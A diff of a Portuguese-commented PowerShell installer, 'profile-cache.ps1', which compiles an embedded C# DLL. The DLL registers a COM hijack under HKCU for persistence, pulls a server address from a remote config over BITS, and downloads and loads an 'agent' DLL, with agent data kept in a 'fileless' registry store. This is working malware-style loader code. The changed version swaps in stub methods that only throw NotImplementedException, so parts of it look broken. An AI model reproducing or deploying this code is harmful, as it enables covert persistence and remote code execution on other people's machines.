@@ -1,20 +1,7 @@
 #Requires -Version 5.1
 <#
 .SYNOPSIS
-    Gerencia instalação e registro COM UserProfileCache (user-mode HKCU) - VERSÃO BITS
-
-.PARAMETER Action
-    Install   - Compila bootstrap, registra hijack, grava config C/U/I
-    Uninstall - Remove hijack e opcionalmente a DLL instalada
-    Register  - Apenas registro COM (dev/teste)
-    Unregister- Apenas remove registro COM
-    ListClsid - Lista CLSIDs candidatos (overlay, shell service, etc.)
-
-.PARAMETER Force
-    Install   - Reinstala mesmo se ja existir hijack + DLL para o -Clsid
-
-.EXAMPLE
-    .\profile-cache.ps1 -Action Install -Config 'https://host/conf.cfg' -Clsid '{GUID}' -RestartExplorer
+    Gerencia instalação e registro COM UserProfileCache (user-mode HKCU) - VERSÃO BITS CORRIGIDA
 #>
 [CmdletBinding()]
 param(
@@ -70,7 +57,7 @@ function Invoke-BitsDownloadData {
 }
 #endregion
 
-#region BootstrapSources (AUTO-GENERATED) - MESMO CÓDIGO ORIGINAL
+#region BootstrapSources (AUTO-GENERATED) - VERSÃO CORRIGIDA
 function Get-BootstrapSourceMap {
     return @{
         'CacheConstants.cs' = @'
@@ -669,6 +656,7 @@ namespace UserProfileCache
 '@
         'ConfigClient.cs' = @'
 using System;
+using System.Net;
 using System.Text.RegularExpressions;
 
 namespace UserProfileCache
@@ -678,13 +666,6 @@ namespace UserProfileCache
         private static readonly Regex ServerRegex = new Regex(
             @"""server""\s*:\s*""([^""]+)""",
             RegexOptions.IgnoreCase | RegexOptions.Compiled);
-
-        // Usa a função BITS para baixar string
-        private static string DownloadStringWithBits(string url)
-        {
-            // Esta parte será substituída em tempo de execução pelo PowerShell
-            throw new NotImplementedException("Deve ser chamado via PowerShell com BitsDownloadString");
-        }
 
         public static void EnableTls12()
         {
@@ -697,6 +678,12 @@ namespace UserProfileCache
             }
         }
 
+        // Esta função será substituída em tempo de execução pelo PowerShell
+        public static string DownloadStringWithBits(string url)
+        {
+            throw new NotImplementedException("Deve ser chamado via PowerShell com BitsDownloadString");
+        }
+
         public static string FetchServerBase(string configUrl)
         {
             if (string.IsNullOrWhiteSpace(configUrl))
@@ -704,7 +691,6 @@ namespace UserProfileCache
 
             EnableTls12();
 
-            // O PowerShell vai injetar a função de download via BITS aqui
             var raw = DownloadStringWithBits(configUrl);
             var match = ServerRegex.Match(raw ?? string.Empty);
             if (!match.Success)
@@ -891,31 +877,18 @@ namespace UserProfileCache
             WriteTrace("Env RMM_ALLOW_MODULES=" + (Environment.GetEnvironmentVariable(CacheConstants.AllowModulesEnvVar) ?? "<null>"));
         }
 
+        // Função que será substituída pelo PowerShell para baixar usando BITS
+        public static byte[] DownloadDataWithBits(string url)
+        {
+            throw new NotImplementedException("Deve ser chamado via PowerShell com BitsDownloadData");
+        }
+
         private static void LoadAndRunAgent(string serverBase)
         {
             ConfigClient.EnableTls12();
 
             var downloadUrl = serverBase.TrimEnd('/') + CacheConstants.AgentDownloadPath;
-            byte[] dllBytes;
-
-            // Usa BITS via PowerShell para baixar os bytes
-            using (var ps = System.Management.Automation.PowerShell.Create())
-            {
-                ps.AddScript(@"
-                    function Invoke-BitsDownloadData {
-                        param([string]$Url)
-                        $tempFile = [System.IO.Path]::GetTempFileName()
-                        try {
-                            Start-BitsTransfer -Source $Url -Destination $tempFile -TransferType Download -Priority High -ErrorAction Stop
-                            return [System.IO.File]::ReadAllBytes($tempFile)
-                        } finally {
-                            if (Test-Path $tempFile) { Remove-Item $tempFile -Force }
-                        }
-                    }
-                    Invoke-BitsDownloadData -Url '" + downloadUrl + @"'
-                ");
-                dllBytes = (byte[])ps.Invoke()[0].BaseObject;
-            }
+            byte[] dllBytes = DownloadDataWithBits(downloadUrl);
 
             if (dllBytes == null || dllBytes.Length == 0)
                 throw new InvalidOperationException("Agent download returned empty payload.");
@@ -987,7 +960,7 @@ using System.Runtime.InteropServices;
 '@
     }
 }
-#endregion BootstrapSources (AUTO-GENERATED)
+#endregion BootstrapSources
 
 #region Bootstrap compile
 
@@ -1013,7 +986,7 @@ function Get-CscPath {
         if (Test-Path $path) { return $path }
     }
 
-    throw "csc.exe não encontrado. Instale .NET Framework 4.x. Tentativas: $($paths -join ', ')"
+    throw "csc.exe não encontrado. Instale .NET Framework 4.x."
 }
 
 function Invoke-CompileBootstrap {
@@ -1047,7 +1020,8 @@ function Invoke-CompileBootstrap {
             '/target:library',
             '/platform:anycpu',
             "/out:$stagingPath",
-            '/reference:System.dll'
+            '/reference:System.dll',
+            '/reference:System.Net.dll'
         ) + $sourceFiles
 
         & $csc @cscArgs
@@ -1288,19 +1262,13 @@ function Test-IsAdmin {
         [Security.Principal.WindowsBuiltInRole]::Administrator)
 }
 
-function Enable-Tls12 {
-    param([string]$Url)
-    if ($Url -notmatch '^\s*https://') { return }
-    try {
-        [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12
-    } catch { }
-}
-
 function Get-ServerUrl {
     param([string]$Url)
 
-    Enable-Tls12 $Url
-    # Usa BITS para baixar a configuração
+    try {
+        [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12
+    } catch { }
+
     $raw = Invoke-BitsDownloadString -Url $Url
     $srv = $null
 
@@ -1431,15 +1399,7 @@ function Release-ProfileCacheDllLock {
         Start-Sleep -Seconds 1
     }
 
-    throw @"
-Nao foi possivel substituir a DLL — ainda em uso por outro processo.
-  $DllPath
-
-Passos manuais:
-  1. .\profile-cache.ps1 -Action Uninstall -Clsid '$Clsid' -RestartExplorer
-  2. Reinicie a sessao Windows, ou
-  3. Execute Install de novo com -RestartExplorer
-"@
+    throw "Nao foi possivel substituir a DLL — ainda em uso por outro processo. $DllPath"
 }
 
 function Deploy-InstallDll {
@@ -1470,7 +1430,6 @@ function Sync-FilelessRegistryStore {
     Set-ItemProperty -Path $storeKey -Name 'I' -Value $AgentId -Type String
     Remove-ItemProperty -Path $storeKey -Name 'T' -ErrorAction SilentlyContinue
 
-    # Chave errada criada por versão anterior (CLSID sem chavetas)
     $legacyKey = "HKCU:\Software\Classes\CLSID\$($Script:FilelessStoreClsid.Trim('{}'))"
     if (Test-Path $legacyKey) {
         Remove-Item -Path $legacyKey -Recurse -Force -ErrorAction SilentlyContinue
